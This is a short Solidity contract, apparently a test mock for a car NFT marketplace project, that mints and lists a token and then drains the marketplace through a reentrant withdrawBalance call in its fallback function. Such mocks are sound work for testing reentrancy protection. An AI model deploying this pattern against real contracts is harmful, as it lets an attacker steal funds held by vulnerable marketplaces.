//SPDX-License-Identifier: MIT
pragma solidity 0.8.25;
import "../CarMarketplace.sol";
import "../CarNFT.sol";

contract MockReentrancyAttack {
    CarMarketplace public marketplace;

    constructor (address _marketplace){
        marketplace = CarMarketplace(_marketplace);
    }

    fallback() external payable {
        if (address(marketplace).balance >= 1 ether) {
            marketplace.withdrawBalance();
        }
    }
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function prepareForAttack(address _carNFT, address _marketplace, string memory URI, uint256 _tokenID) public payable{
        CarNFT carNFT = CarNFT(_carNFT);
        carNFT.mint{value: msg.value}(URI);
        carNFT.approve(_marketplace, _tokenID);
        marketplace.listItem(_carNFT, _tokenID, 1000000000000000000);
    }
    
    function buyItem(address _carNFT, uint256 _tokenID) public payable {
        marketplace.buyItem{value: msg.value}(_carNFT, _tokenID);
    }

    function attack() public {
        marketplace.withdrawBalance(); 
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
}